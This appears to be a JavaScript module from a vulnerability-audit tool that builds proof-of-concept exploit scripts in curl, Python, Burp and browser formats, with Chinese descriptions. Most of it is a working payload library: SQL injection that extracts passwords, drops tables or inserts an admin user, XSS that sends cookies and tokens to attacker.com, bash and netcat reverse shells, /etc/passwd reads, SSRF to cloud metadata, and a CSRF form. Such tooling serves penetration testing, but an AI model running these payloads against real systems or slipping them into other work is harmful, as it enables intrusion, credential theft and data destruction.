/**
 * PoC Generator
 *
 * Generates Proof-of-Concept code for vulnerabilities
 * based on templates, not requiring actual exploitation tools.
 */

class PoCGenerator {
  constructor() {
    // Payload templates for different vulnerability types
    this.payloads = {
      sql_injection: {
        error_based: [
          { payload: "'", desc: '单引号触发错误' },
          { payload: "' AND 1=1", desc: '布尔真条件' },
          { payload: "' AND 1=2", desc: '布尔假条件' },
          { payload: "' AND 1=CAST((SELECT @@version) AS int)", desc: '报错注入获取版本' }
        ],
        union_based: [
          { payload: "' UNION SELECT NULL--", desc: 'UNION测试' },
          { payload: "' UNION SELECT NULL,NULL--", desc: 'UNION测试两列' },
          { payload: "' UNION SELECT @@version,NULL--", desc: 'UNION获取版本' },
          { payload: "' UNION SELECT username,password FROM users--", desc: 'UNION提取用户' }
        ],
        blind_based: [
          { payload: "' AND 1=1", desc: '布尔真' },
          { payload: "' AND 1=2", desc: '布尔假' },
          { payload: "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97", desc: '逐字符盲注' }
        ],
        time_based: [
          { payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)", desc: 'MySQL延迟' },
          { payload: "'; SELECT pg_sleep(5)--", desc: 'PostgreSQL延迟' },
          { payload: "' WAITFOR DELAY '0:0:5'", desc: 'SQL Server延迟' }
        ],
        stacked: [
          { payload: "'; DROP TABLE users;--", desc: '堆叠删除表' },
          { payload: "'; INSERT INTO users VALUES ('admin','password');--", desc: '堆叠插入用户' }
        ]
      },
      xss: {
        basic: [
          { payload: '<script>alert(1)</script>', desc: '基础XSS' },
          { payload: '<img src=x onerror=alert(1)>', desc: '图片错误事件' },
          { payload: "<svg onload=alert(1)>", desc: 'SVG加载事件' },
          { payload: "<body onload=alert(1)>", desc: 'Body加载事件' }
        ],
        advanced: [
          { payload: "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>", desc: '窃取Cookie' },
          { payload: "<script>fetch('http://attacker.com/?c='+localStorage.getItem('token'))</script>", desc: '窃取LocalStorage' },
          { payload: "<form action='http://attacker.com/steal' method='POST'><input name='data' value=''><script>document.forms[0].data.value=document.cookie</script></form>", desc: '表单提交Cookie' }
        ],
        polyglot: [
          { payload: "javascript:alert(1)", desc: 'JS伪协议' },
          { payload: "'onclick='alert(1)", desc: '事件处理器' },
          { payload: '"><script>alert(1)</script>', desc: '标签闭合' }
        ]
      },
      command_injection: {
        basic: [
          { payload: "; id", desc: '执行id命令' },
          { payload: "| whoami", desc: '执行whoami' },
          { payload: "&& cat /etc/passwd", desc: '读取passwd' },
          { payload: "; ping -c 4 attacker.com", desc: 'DNS外带' }
        ],
        blind: [
          { payload: "; sleep 5", desc: '延迟检测' },
          { payload: "| ping -c 4 127.0.0.1", desc: '本地ping' }
        ],
        reverse_shell: [
          { payload: "; bash -i >& /dev/tcp/attacker.com/4444 0>&1", desc: 'Bash反弹Shell' },
          { payload: "| nc -e /bin/sh attacker.com 4444", desc: 'Netcat反弹Shell' }
        ]
      },
      ssrf: {
        basic: [
          { payload: "http://localhost", desc: '访问本地' },
          { payload: "http://127.0.0.1", desc: '访问本地IP' },
          { payload: "http://169.254.169.254/latest/meta-data/", desc: 'AWS元数据' },
          { payload: "file:///etc/passwd", desc: '文件读取' }
        ],
        bypass: [
          { payload: "http://0177.0.0.1", desc: '八进制绕过' },
          { payload: "http://2130706433", desc: '十进制绕过' },
          { payload: "http://0x7f.0x0.0x0.0x1", desc: '十六进制绕过' }
        ],
        internal: [
          { payload: "http://internal-service", desc: '内部服务' },
          { payload: "http://kubernetes.default.svc.cluster.local", desc: 'K8s服务发现' }
        ]
      },
      path_traversal: {
        basic: [
          { payload: "../", desc: '基本遍历' },
          { payload: "../../etc/passwd", desc: '读取passwd' },
          { payload: "../../../var/log/syslog", desc: '读取日志' },
          { payload: "....//....//....//etc/passwd", desc: '双点绕过' }
        ],
        encoded: [
          { payload: "%2e%2e%2f", desc: 'URL编码' },
          { payload: "%252e%252e%252f", desc: '双重编码' },
          { payload: "..%2f", desc: '部分编码' }
        ],
        null_byte: [
          { payload: "../../etc/passwd%00", desc: '空字节截断' },
          { payload: "../../etc/passwd%00.jpg", desc: '扩展名绕过' }
        ]
      },
      idor: {
        basic: [
          { payload: "?id=1", desc: '访问ID 1' },
          { payload: "?id=2", desc: '访问ID 2' },
          { payload: "?user_id=admin", desc: '访问admin' }
        ],
        manipulation: [
          { payload: "?id=1&user_id=2", desc: '参数污染' },
          { payload: "?id[]=1", desc: '数组参数' }
        ]
      },
      weak_crypto: {
        hash: [
          { payload: "test", desc: '测试字符串' },
          { payload: "password", desc: '常见密码' }
        ]
      }
    };

    // PoC templates for different formats
    this.templates = {
      curl: this.initCurlTemplates(),
      python: this.initPythonTemplates(),
      burp: this.initBurpTemplates(),
      browser: this.initBrowserTemplates()
    };
  }

  /**
   * Initialize curl PoC templates
   */
  initCurlTemplates() {
    return {
      get: (url, params) => {
        const queryString = Object.entries(params)
          .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
          .join('&');
        return `curl -X GET "${url}?${queryString}" \
  -H "Accept: application/json" \
  -v`;
      },
      post: (url, data) => {
        return `curl -X POST "${url}" \
  -H "Content-Type: application/json" \
  -d '${JSON.stringify(data)}' \
  -v`;
      },
      post_form: (url, data) => {
        const formData = Object.entries(data)
          .map(([k, v]) => `-F "${k}=${v}"`)
          .join(' \\n  ');
        return `curl -X POST "${url}" \
  ${formData} \
  -v`;
      }
    };
  }

  /**
   * Initialize Python PoC templates
   */
  initPythonTemplates() {
    return {
      get: () => `import requests

url = "{endpoint}"
params = {params}

response = requests.get(url, params=params)
print(f"Status: {response.status_code}")
print(f"Response: {response.text[:500]}")`,

      post: () => `import requests
import time

url = "{endpoint}"
data = {data}

start = time.time()
response = requests.post(url, json=data)
elapsed = time.time() - start

print(f"Status: {response.status_code}")
print(f"Time: {elapsed:.2f}s")
print(f"Response: {response.text[:500]}")`,

      blind: () => `import requests
import time

url = "{endpoint}"

# Time-based detection
for char in range(97, 123):  # a-z
    data = {
        "input": f"' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))={char}) THEN pg_sleep(2) ELSE pg_sleep(0) END)--"
    }

    start = time.time()
    requests.post(url, json=data)
    elapsed = time.time() - start

    if elapsed > 1.5:
        print(f"Found char: {chr(char)}")
        break`
    };
  }

  /**
   * Initialize Burp Suite templates
   */
  initBurpTemplates() {
    return {
      repeater: (payload) => `## Burp Suite Repeater

1. 拦截请求发送至 Repeater
2. 修改参数值为:

${payload}

3. 发送请求并观察响应
4. 对比不同 payload 的响应差异`,

      intruder: () => `## Burp Suite Intruder

1. 拦截请求发送至 Intruder
2. 设置 payload 位置
3. 使用 Sniper 模式
4. Payload 列表:
   - 单引号: '
   - 双引号: "
   - 括号: )
   - 注释: --
   - 布尔: ' OR '1'='1`
    };
  }

  /**
   * Initialize Browser/JavaScript templates
   */
  initBrowserTemplates() {
    return {
      xss: () => `// 在浏览器控制台执行
// XSS PoC

// 基础弹窗
alert('XSS');

// 窃取Cookie
fetch('http://attacker.com/?c=' + encodeURIComponent(document.cookie));

// 窃取localStorage
fetch('http://attacker.com/?t=' + encodeURIComponent(localStorage.getItem('token')));

// 创建隐藏表单提交
var form = document.createElement('form');
form.action = 'http://attacker.com/steal';
form.method = 'POST';
form.innerHTML = '<input name="cookie" value="' + document.cookie + '">';
document.body.appendChild(form);
form.submit();`,

      csrf: () => `// CSRF PoC
// 在受害者浏览器打开此HTML

<form action="{endpoint}" method="POST" id="csrf">
  <input type="hidden" name="action" value="delete">
  <input type="hidden" name="id" value="1">
</form>
<script>document.getElementById('csrf').submit();</script>`
    };
  }

  /**
   * Generate PoC for a vulnerability
   * @param {Object} vuln - Vulnerability object
   * @param {string} format - Output format (curl/python/burp/browser)
   * @returns {Object} PoC object with code and metadata
   */
  generate(vuln, format = 'curl') {
    const payloads = this.getPayloads(vuln.type, vuln.variant);
    const endpoint = this.extractEndpoint(vuln);
    const param = this.extractParam(vuln);

    const poc = {
      type: vuln.type,
      format: format,
      endpoint: endpoint,
      param: param,
      payloads: payloads,
      prerequisites: this.getPrerequisites(vuln),
      expectedBehavior: this.getExpectedBehavior(vuln),
      verificationSteps: this.getVerificationSteps(vuln)
    };

    // Generate format-specific code
    switch (format) {
      case 'curl':
        poc.code = this.generateCurlPoC(vuln, payloads, endpoint, param);
        break;
      case 'python':
        poc.code = this.generatePythonPoC(vuln, payloads, endpoint, param);
        break;
      case 'burp':
        poc.code = this.generateBurpPoC(vuln, payloads);
        break;
      case 'browser':
        poc.code = this.generateBrowserPoC(vuln);
        break;
      default:
        poc.code = this.generateCurlPoC(vuln, payloads, endpoint, param);
    }

    return poc;
  }

  /**
   * Get payloads for vulnerability type
   */
  getPayloads(type, variant) {
    const payloads = this.payloads[type];
    if (!payloads) {
      return [{ payload: 'PAYLOAD', desc: 'Generic payload' }];
    }

    // Return specific variant or all
    if (variant && payloads[variant]) {
      return payloads[variant];
    }

    // Merge all payload types
    return Object.values(payloads).flat();
  }

  /**
   * Generate curl PoC
   */
  generateCurlPoC(vuln, payloads, endpoint, param) {
    const lines = ['#!/bin/bash', '', '# Generated PoC for ' + vuln.type, ''];

    // HTTP method detection
    const isPost = vuln.entryPointCode?.includes('@PostMapping') ||
                   vuln.entryPointCode?.includes('@RequestBody');

    lines.push(`ENDPOINT="${endpoint}"`);
    lines.push('');

    // Generate curl commands for each payload
    for (const p of payloads.slice(0, 5)) { // Limit to 5 payloads
      lines.push(`# ${p.desc}`);
      lines.push(`echo "Testing: ${p.payload}"`);

      if (isPost) {
        const data = JSON.stringify({ [param]: p.payload });
        lines.push(`curl -X POST "$ENDPOINT" \\\n  -H "Content-Type: application/json" \\\n  -d '${data}' \\\n  -v`);
      } else {
        const encodedPayload = encodeURIComponent(p.payload);
        lines.push(`curl -X GET "$ENDPOINT?${param}=${encodedPayload}" \\\n  -v`);
      }
      lines.push('');
    }

    return lines.join('\n');
  }

  /**
   * Generate Python PoC
   */
  generatePythonPoC(vuln, payloads, endpoint, param) {
    const isPost = vuln.entryPointCode?.includes('@PostMapping') ||
                   vuln.entryPointCode?.includes('@RequestBody');

    let code = `#!/usr/bin/env python3
"""
PoC for ${vuln.type}
Target: ${endpoint}
"""

import requests
import time
import sys

ENDPOINT = "${endpoint}"

`;

    if (vuln.type === 'sql_injection' && vuln.isBlind) {
      // Blind SQLi specific code
      code += this.templates.python.blind();
    } else {
      code += this.templates.python[isPost ? 'post' : 'get']();
    }

    // Replace placeholders
    const payloadList = payloads.slice(0, 3).map(p => p.payload);
    code = code.replace('{endpoint}', endpoint);
    code = code.replace('{params}', `{"${param}": "${payloadList[0]}"}`);
    code = code.replace('{data}', `{"${param}": "${payloadList[0]}"}`);

    return code;
  }

  /**
   * Generate Burp Suite PoC
   */
  generateBurpPoC(vuln, payloads) {
    const lines = ['# Burp Suite PoC Instructions', ''];

    lines.push('## Payloads to test');
    lines.push('');

    for (const p of payloads.slice(0, 10)) {
      lines.push(`- \`${p.payload}\` (${p.desc})`);
    }

    lines.push('');
    lines.push(this.templates.burp.repeater(payloads[0]?.payload || 'PAYLOAD'));

    return lines.join('\n');
  }

  /**
   * Generate Browser PoC
   */
  generateBrowserPoC(vuln) {
    if (vuln.type === 'xss') {
      return this.templates.browser.xss();
    }

    if (vuln.type === 'csrf') {
      return this.templates.browser.csrf()
        .replace('{endpoint}', vuln.endpoint || 'TARGET_URL');
    }

    return `// Browser PoC for ${vuln.type}
// Navigate to: ${vuln.endpoint || 'TARGET_URL'}

// Intercept and modify requests using browser DevTools
// or use the curl/python PoC scripts instead.`;
  }

  /**
   * Extract endpoint from vulnerability
   */
  extractEndpoint(vuln) {
    // Try to extract from annotations
    const entryCode = vuln.entryPointCode || '';
    const pathMatch = entryCode.match(/@\w+Mapping\s*\(\s*["']([^"']+)["']/);
    if (pathMatch) {
      return `http://localhost:8080${pathMatch[1]}`;
    }

    // Return default
    return vuln.endpoint || 'http://localhost:8080/api/target';
  }

  /**
   * Extract parameter name from vulnerability
   */
  extractParam(vuln) {
    // Try to extract from annotations
    const code = vuln.entryPointCode || vuln.codeSnippet || '';

    const paramMatch = code.match(/@\w+Param\s*\(\s*["']([^"']+)["']\s*\)/);
    if (paramMatch) return paramMatch[1];

    const bodyMatch = code.match(/@RequestBody\s+\w+\s+(\w+)/);
    if (bodyMatch) return bodyMatch[1];

    const pathMatch = code.match(/@PathVariable\s+\w+\s+(\w+)/);
    if (pathMatch) return pathMatch[1];

    return 'input';
  }

  /**
   * Get prerequisites for exploitation
   */
  getPrerequisites(vuln) {
    const prereqs = [];

    switch (vuln.type) {
      case 'sql_injection':
        prereqs.push('数据库连接正常');
        prereqs.push('错误回显（如为报错注入）或有时间延迟（如为盲注）');
        break;
      case 'xss':
        prereqs.push('输入点在页面中回显');
        prereqs.push('无CSP限制或CSP允许内联脚本');
        break;
      case 'command_injection':
        prereqs.push('命令执行权限');
        prereqs.push('无输入过滤或过滤可绕过');
        break;
      case 'ssrf':
        prereqs.push('服务器可访问目标URL');
        prereqs.push('无URL白名单限制或限制可绕过');
        break;
    }

    return prereqs;
  }

  /**
   * Get expected behavior
   */
  getExpectedBehavior(vuln) {
    switch (vuln.type) {
      case 'sql_injection':
        return '数据库错误或异常数据返回';
      case 'xss':
        return 'JavaScript alert弹窗或页面内容改变';
      case 'command_injection':
        return '命令执行结果返回或延迟响应';
      case 'ssrf':
        return '成功访问内部服务或获取敏感数据';
      case 'path_traversal':
        return '越权读取文件系统敏感文件';
      case 'idor':
        return '获取到其他用户/商户的私有数据';
      default:
        return '异常行为或错误响应';
    }
  }

  /**
   * Get verification steps
   */
  getVerificationSteps(vuln) {
    return [
      '1. 运行 PoC 代码',
      '2. 观察响应结果',
      `3. 确认 ${vuln.type} 是否触发`,
      '4. 记录成功 payload'
    ];
  }

  /**
   * Generate multiple PoC formats
   */
  generateAll(vuln) {
    const formats = ['curl', 'python', 'burp'];

    // Add browser format for XSS
    if (vuln.type === 'xss' || vuln.type === 'csrf') {
      formats.push('browser');
    }

    return formats.map(format => this.generate(vuln, format));
  }
}

// Export
export function createPoCGenerator() {
  return new PoCGenerator();
}

export default PoCGenerator;
